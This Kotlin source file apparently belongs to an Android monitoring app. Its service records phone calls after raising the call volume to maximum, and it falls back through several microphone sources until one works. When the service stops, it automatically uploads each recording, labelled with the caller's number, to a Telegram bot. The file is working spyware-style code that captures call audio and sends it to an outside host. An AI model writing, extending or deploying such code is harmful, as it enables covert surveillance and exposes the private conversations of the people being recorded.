package com.dec.monitor.call

import android.app.*
import android.content.Intent
import android.media.AudioManager
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.dec.monitor.TelegramBot
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class CallRecordingService : Service() {

    private var recorder: MediaRecorder? = null
    private var outputFile: File? = null
    private var callerNumber = "unknown"

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        callerNumber = intent?.getStringExtra("number") ?: "unknown"
        startForeground(1, buildNotification())
        startRecording()
        return START_NOT_STICKY
    }

    private fun startRecording() {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        outputFile = File(getExternalFilesDir(null), "call_${timestamp}.mp3")

        try {
            val am = getSystemService(AUDIO_SERVICE) as AudioManager
            am.setStreamVolume(
                AudioManager.STREAM_VOICE_CALL,
                am.getStreamMaxVolume(AudioManager.STREAM_VOICE_CALL),
                0
            )
        } catch (e: Exception) {
            Log.e("CallRecorder", "Volume boost failed: ${e.message}")
        }

        val sources = listOf(
            MediaRecorder.AudioSource.VOICE_COMMUNICATION,
            MediaRecorder.AudioSource.VOICE_RECOGNITION,
            MediaRecorder.AudioSource.MIC,
            MediaRecorder.AudioSource.DEFAULT
        )

        for (source in sources) {
            if (tryRecord(source)) return
        }
    }

    private fun tryRecord(source: Int): Boolean {
        return try {
            val r = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(this)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }
            r.apply {
                setAudioSource(source)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setAudioSamplingRate(44100)
                setAudioEncodingBitRate(192000)
                setOutputFile(outputFile?.absolutePath)
                prepare()
                start()
            }
            recorder = r
            true
        } catch (e: Exception) {
            false
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { recorder?.stop(); recorder?.release() } catch (e: Exception) {}
        recorder = null
        outputFile?.let { file ->
            if (file.exists() && file.length() > 1024) {
                CoroutineScope(Dispatchers.IO).launch {
                    TelegramBot.sendAudio(file, "🎙 Call — $callerNumber")
                }
            }
        }
    }

    private fun buildNotification(): Notification {
        val channelId = "call_recorder"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "Call Recorder", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
        return NotificationCompat.Builder(this, channelId)
            .setContentTitle("Recording call...")
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
